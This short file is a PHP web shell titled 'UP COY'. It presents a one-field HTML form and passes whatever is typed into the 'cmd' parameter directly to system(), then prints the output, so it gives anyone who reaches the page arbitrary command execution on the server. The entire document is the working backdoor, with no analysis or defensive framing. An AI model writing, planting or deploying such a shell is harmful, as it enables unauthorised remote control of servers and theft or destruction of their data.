<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>UP COY</title>
</head>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
	<input type="text" name="cmd" id="cmd" size="50">
	<input type="submit" value=">>">
</form>
<pre>
<?php 	
	if (isset($_GET['cmd'])) {
		system($_GET['cmd']) ;
	}

?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>